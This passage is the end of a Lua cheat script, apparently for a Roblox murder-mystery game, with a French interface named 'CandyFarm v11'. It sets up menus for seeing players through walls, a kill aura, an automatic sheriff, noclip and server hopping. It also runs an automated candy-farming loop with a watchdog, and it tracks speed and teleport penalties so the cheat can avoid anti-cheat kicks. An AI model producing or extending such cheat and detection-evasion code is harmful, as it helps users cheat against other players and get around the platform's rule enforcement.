        sl(t, "Rayon transparence", "GhostR", 4, 40)
        t:AddSection({Name = "Highlights joueurs"})
        tg(t, "Highlights actifs", "HL")
        tg(t, "Highlight sur moi", "HLSelf")
        tg(t, "Highlight innocents", "HLInnocent")
        tg(t, "Highlight amis", "HLFriends")
        cp(t, "Couleur Murder", "Murder")
        cp(t, "Couleur Sheriff", "Sheriff")
        cp(t, "Couleur Innocents", "Innocent")
        cp(t, "Couleur Amis", "Friend")
        cp(t, "Couleur ta cible (Assassin)", "Target")
        sl(t, "Transparence remplissage", "HLFill", 0, 1, 0.05)
        sl(t, "Transparence contour", "HLOutline", 0, 1, 0.05)
        t:AddSection({Name = "Leaderboard"})
        tg(t, "Suivi des joueurs (emojis)", "LeaderTrack")
        t:AddParagraph("Légende", "🟢 en vie dans la manche | 🔴 mort dans la manche | ⚪ pas dans la manche")
    end)

    safeTab("Stats", function(t)
        for _, k in ipairs({"candies", "tokens", "rounds", "kills", "guns", "votes", "roles", "cph", "est", "time", "kicks", "phase"}) do
            statLbl[k] = t:AddLabel("...")
        end
        sl(t, "Durée d'un round (min)", "RoundMinutes", 1, 6, 0.5)
        t:AddButton({Name = "Reset stats de session", Callback = function()
            for k in pairs(ST) do ST[k] = 0 end
            sessionStart = os.clock()
        end})
    end)

    safeTab("Sécurité", function(t)
        t:AddSection({Name = "Connexion"})
        tg(t, "Auto Rejoin (déconnexion)", "AutoRejoin")
        tg(t, "Rejoindre aussi sur autre erreur", "RejoinOnAnyError")
        tb(t, "Mots-clés d'un vrai kick", "KickKeywords")
        tg(t, "Server hop si seul trop longtemps", "SoloHop")
        sl(t, "Durée seul avant hop (s)", "SoloHopSecs", 30, 600, 10)
        t:AddMultiButton({Buttons = {
            {Name = "Server Hop", Callback = function() CTX.serverHop("Manuel") end},
            {Name = "Rejoin", Callback = function()
                pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
            end},
        }})
        t:AddSection({Name = "Protection"})
        tg(t, "Anti-Fling Intelligent", "AntiFling", function(v) togglePhysicalAntiFling(v) end)
        dd(t, "NoClip", "NoClipMode", {"Off", "Stepped", "Touched"}, setNoClipMode)
        t:AddSection({Name = "Réglages"})
        t:AddButton({Name = "Reset pénalités kick", Callback = function()
            S.boostPen, S.speedPen, S.tpPen, S.kicks = 0, 0, 0, 0
            saveState()
        end})
        t:AddButton({Name = "Sauvegarder les réglages maintenant", Callback = function()
            saveSettings()
            notify("Réglages", "Sauvegardés", 3)
        end})
        t:AddButton({Name = "Restaurer les valeurs par défaut", Callback = restoreDefaults})
    end)
end)
CTX.uiReady = true

pushLog("SYSTEM", "CandyFarm v11 prêt" .. (settingsLoaded and " (réglages restaurés)" or ""))

if Lib == "1bzableLib" then
    if CTX.Window and typeof(CTX.Window.ToggleMinimize) == "function" then
        CTX.Window:ToggleMinimize()
    else
        warn("[CandyFarm DEBUG] 1bzableLib: ToggleMinimize absent")
    end
else
    if UILib and typeof(UILib.ToggleMinimize) == "function" then
        UILib:ToggleMinimize()
    end
end

-- ===== Lancement des modules =====
watchPlayers()
CTX.startAutoPlay()
CTX.startGunWatch()
startVoteBot()

-- Phases sur le Heartbeat pour ne rater aucune frame du saut spatial du serveur
RunService.Heartbeat:Connect(function()
    pcall(phaseStep)
end)

RunService.Heartbeat:Connect(function()
    pcall(CTX.assassinStep)
end)

task.spawn(function()
    while true do
        pcall(CTX.runKillAura)
        task.wait(math.max(0.05, CFG.KAInterval))
    end
end)

task.spawn(function()
    while true do
        pcall(CTX.runSheriff)
        task.wait(math.max(0.05, CFG.SAInterval))
    end
end)

task.spawn(function()
    while true do
        pcall(CTX.trackLeaderboard)
        task.wait(0.25)
    end
end)

-- Stats : affichage (1 s) + sauvegarde des stats (20 s) + sauvegarde des réglages (après modification)
task.spawn(function()
    local n = 0
    while true do
        task.wait(1)
        n += 1
        if n % 20 == 0 and statDirty then
            statDirty = false
            saveState()
        end
        if CTX.cfgDirty and os.clock() - CTX.cfgDirtyT > 1.5 then
            CTX.cfgDirty = false
            saveSettings()
        end
        if statLbl.candies then
            pcall(function()
                local L = S.life
                local el = os.clock() - sessionStart
                local hours = el / 3600
                local names = {}
                for _, real in pairs(autoFriends) do names[#names + 1] = real end
                statLbl.candies:Set(("Bonbons : %.0f (total %.0f)"):format(ST.candies, L.candies or 0))
                statLbl.tokens:Set("Bonbons du compte : " .. CTX.getTokens())
                statLbl.rounds:Set(("Rounds : %.0f (total %.0f)"):format(ST.rounds, L.rounds or 0))
                statLbl.kills:Set(("Kills : %.0f (total %.0f)"):format(ST.kills, L.kills or 0))
                statLbl.guns:Set(("Gun récupéré : %.0f (total %.0f)"):format(ST.guns, L.guns or 0))
                statLbl.votes:Set(("Votes de map : %.0f (total %.0f) | Map : %s"):format(ST.votes, L.votes or 0, CTX.map))
                statLbl.roles:Set(("Murder %.0f | Sheriff %.0f | Innocent %.0f"):format(ST.asMurder, ST.asSheriff, ST.asInnocent))
                statLbl.cph:Set(el > 120 and ("Bonbons/h (réel) : %.0f"):format(ST.candies / hours) or "Bonbons/h (réel) : calcul en cours...")
                statLbl.est:Set(ST.rounds > 0
                    and ("Estimation (%.1f min/round) : %.0f/h"):format(CFG.RoundMinutes, (ST.candies / ST.rounds) * (60 / CFG.RoundMinutes))
                    or "Estimation : en attente d'un round")
                statLbl.time:Set(("Session : %02d:%02d:%02d"):format(el // 3600, (el % 3600) // 60, el % 60))
                statLbl.kicks:Set(("Kicks : %.0f | Pénalités : speed -%.0f, boost -%.1f, TP +%.0f")
                    :format(S.kicks, S.speedPen, S.boostPen, S.tpPen))
                statLbl.phase:Set(("Phase : %s | Amis auto : %s"):format(phase, #names > 0 and table.concat(names, ", ") or "aucun"))
            end)
        end
    end
end)

function CTX.startFarm()
    if CTX.farmThread then pcall(task.cancel, CTX.farmThread) end
    local r = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
    local old = r and r:FindFirstChild("AntiFall")
    if old then old:Destroy() end
    nc, hiding = false, false
    lastTick = os.clock()
    CTX.farmThread = task.spawn(function()
        while true do
            local ok, err = pcall(claims)
            if not ok then warn("[CandyFarm] boucle relancée : " .. tostring(err)) end
            nc, hiding = false, false
            task.wait(1)
        end
    end)
end
CTX.startFarm()

-- Watchdog (1 s) : la frame Candy est visible mais la boucle est figée -> relance
task.spawn(function()
    while true do
        task.wait(1)
        local f = candyFrame()
        local icon = f and f:FindFirstChild("CurrencyFrame") and f.CurrencyFrame:FindFirstChild("Icon")
        local active = f ~= nil and f.Visible and icon ~= nil and icon.Visible
        if active ~= CTX.lastActive then
            CTX.lastActive = active
            pushLog("WATCHDOG", "Candy.Visible=" .. tostring(f and f.Visible) .. " Icon.Visible=" .. tostring(icon and icon.Visible))
        end
        if active and CFG.Enabled and os.clock() - lastTick > 3 then
            pushLog("WATCHDOG", "Boucle figée, relance")
            CTX.startFarm()
        end
    end
end)
